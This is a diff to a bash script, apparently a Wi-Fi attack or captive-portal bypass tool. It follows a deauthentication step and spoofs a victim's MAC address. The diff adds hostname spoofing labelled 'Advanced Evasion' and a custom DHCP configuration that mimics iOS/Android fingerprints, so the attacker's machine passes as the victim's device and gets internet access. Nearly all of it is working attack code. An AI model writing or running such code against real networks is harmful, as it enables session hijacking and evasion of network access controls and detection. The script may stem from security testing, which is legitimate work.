@@ -85,14 +85,31 @@ if [[ "$deauth_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
 fi
 
 # 3. Spoofing Execution
-echo "[*] Executing MAC spoofing for $VICTIM_MAC..."
+echo "[*] Executing Full Identity Spoofing for $VICTIM_MAC..."
 ip link set "$INTERFACE" down
 macchanger -m "$VICTIM_MAC" "$INTERFACE"
+
+# Spoof Hostname (Advanced Evasion)
+OLD_HOSTNAME=$(hostname)
+SPOOFED_HOSTNAME="iPad-of-$(echo $VICTIM_MAC | cut -d: -f5,6 | tr -d ':')"
+echo "[*] Temporarily spoofing hostname to $SPOOFED_HOSTNAME..."
+hostname "$SPOOFED_HOSTNAME"
+trap "hostname $OLD_HOSTNAME" EXIT
+
 ip link set "$INTERFACE" up
 
-echo "[*] Requesting DHCP lease for spoofed identity (15s timeout)..."
-# Use timeout to prevent infinite hang if network blocks the MAC
-timeout 15 dhclient -v "$INTERFACE" || true
+echo "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
+# Create custom dhclient.conf to mimic iOS/Android parameters
+DHCP_CONF="${EVIDENCE_DIR}/f4_dhclient.conf"
+cat <<EOF > "$DHCP_CONF"
+send host-name "$SPOOFED_HOSTNAME";
+request subnet-mask, broadcast-address, time-offset, routers,
+        domain-name, domain-name-servers, domain-search, host-name,
+        netbios-name-servers, netbios-scope, interface-mtu,
+        rfc3442-classless-static-routes, ntp-servers;
+EOF
+
+timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
 
 # 4. Verification
 echo "[*] Verifying internet access..."
